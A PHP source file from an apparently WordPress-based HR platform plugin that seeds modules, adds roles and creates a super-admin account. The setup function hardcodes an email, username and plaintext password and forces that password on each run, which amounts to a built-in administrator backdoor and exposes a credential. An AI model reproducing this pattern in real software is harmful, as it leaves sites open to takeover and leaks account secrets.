<?php
/**
 * Platform Authentication and Role Management
 */

if (!defined('ABSPATH')) {
    exit;
}

class Thriveo_AI_Plataforma_Auth
{
    public static function setup_super_admin()
    {
        global $wpdb;

        $email = 'ezequiel.santos@gmail.com';
        $password = 'Kyew@1802';
        $username = 'ezequiel_santos';

        // 1. Create WP User if not exists
        $user_id = email_exists($email);
        if (!$user_id) {
            $user_id = wp_create_user($username, $password, $email);
        } else {
            // Update password just in case it was changed in prompt
            wp_set_password($password, $user_id);
        }

        if (is_wp_error($user_id)) {
            return;
        }

        // 2. Set WP Role to Administrator (so he can access WP backend if needed)
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        // 3. Register in thriveo_plataforma_usuarios as super_admin
        $table_plt_users = $wpdb->prefix . 'thriveo_plataforma_usuarios';
        
        $exists = $wpdb->get_var($wpdb->prepare(
            "SELECT id FROM $table_plt_users WHERE wp_user_id = %d",
            $user_id
        ));

        if (!$exists) {
            $wpdb->insert($table_plt_users, [
                'wp_user_id' => $user_id,
                'empresa_id' => null, // Super Admin has no fixed company
                'role'       => 'super_admin'
            ]);
        } else {
            $wpdb->update($table_plt_users, 
                ['role' => 'super_admin', 'empresa_id' => null],
                ['wp_user_id' => $user_id]
            );
        }
    }

    public static function seed_modules()
    {
        global $wpdb;
        $table = $wpdb->prefix . 'thriveo_modulos';
        
        $modules = [
            ['nome' => 'Seleção e Vagas (IA)', 'slug' => 'ai-jobs', 'desc' => 'Gestão de recrutamento com inteligência artificial.'],
            ['nome' => 'DISC Assessment', 'slug' => 'disc', 'desc' => 'Avaliação de perfil comportamental.'],
            ['nome' => 'ZBB (Zero-Based Budgeting)', 'slug' => 'zbb', 'desc' => 'Gestão orçamentária matricial.'],
            ['nome' => 'PDI & Performance', 'slug' => 'pdi', 'desc' => 'Plano de desenvolvimento individual.'],
        ];

        foreach ($modules as $m) {
            $exists = $wpdb->get_var($wpdb->prepare("SELECT id FROM $table WHERE slug = %s", $m['slug']));
            if (!$exists) {
                $wpdb->insert($table, [
                    'nome' => $m['nome'],
                    'slug' => $m['slug'],
                    'descricao' => $m['desc'],
                    'ativo' => 1
                ]);
            }
        }
    }

    public static function add_platform_roles()
    {
        // Administrador de Empresa
        add_role('thriveo_empresa_admin', 'Thriveo Empresa Admin', [
            'read' => true,
            'thriveo_manage_company' => true,
        ]);

        // Usuário (Responsável por Métodos)
        add_role('thriveo_usuario', 'Thriveo Usuário', [
            'read' => true,
            'thriveo_access_modules' => true,
        ]);
    }
}
